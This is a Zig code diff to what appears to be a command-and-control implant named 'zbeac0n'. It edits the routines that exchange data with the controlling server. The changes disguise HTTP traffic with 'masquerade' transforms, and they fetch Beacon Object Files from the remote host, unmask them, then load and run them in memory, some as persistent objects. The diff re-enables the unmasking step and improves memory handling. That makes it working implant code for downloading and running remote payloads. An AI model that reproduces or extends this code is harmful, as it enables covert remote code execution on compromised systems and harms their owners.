@@ -143,6 +143,7 @@ fn netExchange(
         else => return null,
     };
 
+
     if (res != null) {
         return @ptrCast(res.?.ptr);
     }
@@ -176,7 +177,9 @@ fn netHttpExchange(
 
         // apply HTTP header transforms
         _ = s.implant_actions.netMasquerade(s, connectionType, &http_reqOptions, null, len);
+
     } else if (connectionType == .ResourceFetch and extra_data != null) {
+
         // in case of ResourceFetch exchange extra_data is a  0-terminated path to the resource
         const bof_path: []const u8 = std.mem.sliceTo(@as([*:0]const u8, @ptrCast(extra_data)), 0);
 
@@ -230,18 +233,14 @@ fn netHttpExchange(
         return error.BadData;
     }
 
-    const response_content = try s.allocator.alloc(u8, @intCast(response.head.content_length.?));
-    errdefer s.allocator.free(response_content);
-
-    // read body content
-    const response_reader = response.reader(response_content);
-    try response_reader.readSliceAll(response_content);
+    const body = try response.reader(&.{}).allocRemaining(s.allocator, .unlimited);
+    errdefer s.allocator.free(body);
 
     // update body length
-    len.* = @intCast(response_content.len);
+    len.* = @intCast(body.len);
 
     if (connectionType != .TaskResult) {
-        return response_content;
+        return body;
     }
 
     return null;
@@ -402,13 +401,13 @@ fn receiveAndLaunchBof(allocator: std.mem.Allocator, state: *zbeac0n.State, task
             var body_len: u32 = 0;
             const masked_bof_content: ?[*]u8 = @ptrCast(state.implant_actions.netExchange(state, zbeac0n.netConnectionType.ResourceFetch, conn, &body_len, @constCast(@ptrCast(bof_path.ptr))));
             std.log.info("after BOF fetch (BOF size: {d})", .{body_len});
-            std.log.info("BOF content: {s}", .{masked_bof_content.?[0..body_len]});
 
-            const new_body_len = body_len;
-            //const bof_content: ?[*]u8 = @ptrCast(state.implant_actions.netUnmasquerade(state, zbeac0n.netConnectionType.ResourceFetch, @constCast(@ptrCast(masked_bof_content)), &new_body_len));
+            var new_body_len = body_len;
+            const bof_content: ?[*]u8 = @ptrCast(state.implant_actions.netUnmasquerade(state, zbeac0n.netConnectionType.ResourceFetch, @constCast(@ptrCast(masked_bof_content)), &new_body_len));
 
-            if (masked_bof_content) |b| {
+            if (bof_content) |b| {
                 std.log.info("after BOF unmasquerade (new BOF size: {d})", .{new_body_len});
+
                 bof_to_exec = try bof.Object.initFromMemory(b[0..new_body_len]);
                 errdefer bof_to_exec.release();
 
@@ -416,6 +415,7 @@ fn receiveAndLaunchBof(allocator: std.mem.Allocator, state: *zbeac0n.State, task
                     try state.persistent_bofs.put(hash, bof_to_exec);
                     std.log.info("Loaded new persistent BOF (hash: 0x{x})", .{hash});
                 }
+                state.allocator.free(b[0..new_body_len]);
             }
             state.implant_actions.netDisconnect(state, conn);
         }
